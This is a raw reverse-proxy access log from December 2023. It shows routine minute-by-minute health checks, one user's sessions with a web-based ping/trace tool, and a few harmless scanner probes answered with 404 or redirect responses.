167.71.120.76 - - [18/Dec/2023:00:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2934 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:00:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2935 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2936 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:00:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2937 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2938 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:00:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2939 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2940 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:00:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2941 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2942 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:00:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2943 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2944 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:00:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2945 "www@docker" "http://172.18.0.9:80" 4ms
167.71.120.76 - - [18/Dec/2023:00:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2946 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:00:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2947 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2948 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:00:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2949 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:00:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2950 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2951 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2952 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2953 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2954 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [18/Dec/2023:01:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2955 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2956 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2957 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2958 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2959 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2960 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2961 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [18/Dec/2023:01:05:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2962 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:01:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2963 "www@docker" "http://172.18.0.9:80" 0ms
198.199.113.49 - - [18/Dec/2023:01:05:39 +0000] "GET /version HTTP/1.1" 404 19 "-" "-" 2964 "-" "-" 0ms
143.110.222.166 - - [18/Dec/2023:01:05:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2965 "web-to-websecure@internal" "-" 0ms
162.216.150.214 - - [18/Dec/2023:01:05:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2966 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2967 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2968 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2969 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2970 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2971 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2972 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.108 - - [18/Dec/2023:01:08:39 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2973 "web-to-websecure@internal" "-" 0ms
90.151.171.108 - - [18/Dec/2023:01:08:56 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 2974 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2975 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2976 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2977 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2978 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2979 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2980 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2981 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2982 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2983 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2984 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2985 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2986 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2987 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2988 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2989 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2990 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2991 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2992 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2993 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2994 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2995 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:01:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2996 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2997 "www@docker" "http://172.18.0.9:80" 32ms
173.48.140.140 - - [18/Dec/2023:01:20:27 +0000] "GET /trace/ HTTP/2.0" 200 5856 "-" "-" 2998 "livetrace@docker" "http://172.18.0.3:80" 28ms
173.48.140.140 - - [18/Dec/2023:01:20:27 +0000] "GET /trace/styles.css?version=0.8 HTTP/2.0" 200 1383 "-" "-" 2999 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:33 +0000] "GET /trace/startping.php?id=optps70b4 HTTP/2.0" 200 105 "-" "-" 3000 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:01:20:34 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 33 "-" "-" 3001 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:01:20:35 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 56 "-" "-" 3002 "livetrace@docker" "http://172.18.0.3:80" 2ms
45.33.87.154 - - [18/Dec/2023:01:20:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3003 "-" "-" 0ms
173.48.140.140 - - [18/Dec/2023:01:20:36 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 81 "-" "-" 3004 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:37 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 105 "-" "-" 3005 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [18/Dec/2023:01:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3006 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [18/Dec/2023:01:20:38 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 123 "-" "-" 3007 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:39 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 148 "-" "-" 3008 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:40 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 173 "-" "-" 3009 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:41 +0000] "GET /trace/pollping.php?id=optps70b4 HTTP/2.0" 200 201 "-" "-" 3010 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:41 +0000] "GET /trace/cleanping.php?id=optps70b4 HTTP/2.0" 200 71 "-" "-" 3011 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:46 +0000] "GET /trace/startping.php?id=zyxffshe7 HTTP/2.0" 200 105 "-" "-" 3012 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:01:20:46 +0000] "GET /trace/starttrace.php?id=3tw20m6z1 HTTP/2.0" 200 106 "-" "-" 3013 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [18/Dec/2023:01:20:47 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 80 "-" "-" 3015 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:47 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 32 "-" "-" 3014 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:48 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 56 "-" "-" 3016 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:48 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 80 "-" "-" 3017 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:49 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 80 "-" "-" 3019 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:49 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 80 "-" "-" 3018 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:01:20:50 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 80 "-" "-" 3021 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:50 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 105 "-" "-" 3020 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:51 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 129 "-" "-" 3022 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:01:20:51 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 80 "-" "-" 3023 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:52 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 80 "-" "-" 3025 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:52 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 152 "-" "-" 3024 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:01:20:53 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 147 "-" "-" 3027 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:53 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 180 "-" "-" 3026 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [18/Dec/2023:01:20:54 +0000] "GET /trace/pollping.php?id=zyxffshe7 HTTP/2.0" 200 204 "-" "-" 3028 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [18/Dec/2023:01:20:54 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 147 "-" "-" 3029 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:54 +0000] "GET /trace/cleanping.php?id=zyxffshe7 HTTP/2.0" 200 71 "-" "-" 3030 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:01:20:55 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 147 "-" "-" 3031 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:56 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 692 "-" "-" 3032 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:20:57 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 692 "-" "-" 3033 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:58 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 692 "-" "-" 3034 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:20:59 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 715 "-" "-" 3035 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:21:00 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 715 "-" "-" 3036 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:21:01 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 715 "-" "-" 3037 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:21:02 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 717 "-" "-" 3038 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:21:03 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 717 "-" "-" 3039 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:21:04 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 717 "-" "-" 3040 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:21:05 +0000] "GET /trace/polltrace.php?id=3tw20m6z1 HTTP/2.0" 200 970 "-" "-" 3041 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:21:05 +0000] "GET /trace/cleantrace.php?id=3tw20m6z1 HTTP/2.0" 200 72 "-" "-" 3042 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:01:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3043 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3044 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3045 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3046 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3047 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3048 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3049 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3050 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.251 - - [18/Dec/2023:01:24:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3051 "-" "-" 0ms
192.241.201.80 - - [18/Dec/2023:01:24:46 +0000] "GET /actuator/health HTTP/1.1" 301 17 "-" "-" 3052 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [18/Dec/2023:01:25:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3053 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3054 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3055 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3056 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3057 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3058 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3059 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3060 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3061 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3062 "www@docker" "http://172.18.0.9:80" 2ms
167.71.120.76 - - [18/Dec/2023:01:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3063 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3064 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3065 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3066 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3067 "www@docker" "http://172.18.0.9:80" 1ms
71.6.232.27 - - [18/Dec/2023:01:31:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3068 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3069 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3070 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3071 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3072 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:01:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3073 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3074 "www@docker" "http://172.18.0.9:80" 1ms
45.79.168.172 - - [18/Dec/2023:01:35:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3075 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:01:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3076 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.34 - - [18/Dec/2023:01:35:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3077 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:01:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3078 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3079 "www@docker" "http://172.18.0.9:80" 0ms
172.104.210.105 - - [18/Dec/2023:01:36:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3080 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:01:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3081 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [18/Dec/2023:01:36:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3082 "-" "-" 0ms
173.48.140.140 - - [18/Dec/2023:01:37:16 +0000] "GET /trace/ HTTP/2.0" 200 5856 "-" "-" 3083 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [18/Dec/2023:01:37:16 +0000] "GET /trace/styles.css?version=0.8 HTTP/2.0" 304 0 "-" "-" 3084 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [18/Dec/2023:01:37:19 +0000] "GET /trace/starttrace.php?id=7drmlmshd HTTP/2.0" 200 106 "-" "-" 3085 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:37:20 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 452 "-" "-" 3086 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:37:21 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 452 "-" "-" 3087 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:37:22 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 452 "-" "-" 3088 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:37:23 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 475 "-" "-" 3089 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3090 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:37:24 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 475 "-" "-" 3091 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:37:25 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 475 "-" "-" 3092 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:37:26 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 477 "-" "-" 3093 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:01:37:27 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 477 "-" "-" 3094 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:37:28 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 477 "-" "-" 3095 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:37:29 +0000] "GET /trace/polltrace.php?id=7drmlmshd HTTP/2.0" 200 731 "-" "-" 3096 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:01:37:29 +0000] "GET /trace/cleantrace.php?id=7drmlmshd HTTP/2.0" 200 72 "-" "-" 3097 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [18/Dec/2023:01:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3098 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:01:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3099 "www@docker" "http://172.18.0.9:80" 26ms
167.71.120.76 - - [18/Dec/2023:01:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3100 "www@docker" "http://172.18.0.9:80" 17ms
159.203.109.206 - - [18/Dec/2023:01:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3101 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:01:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3102 "www@docker" "http://172.18.0.9:80" 1ms
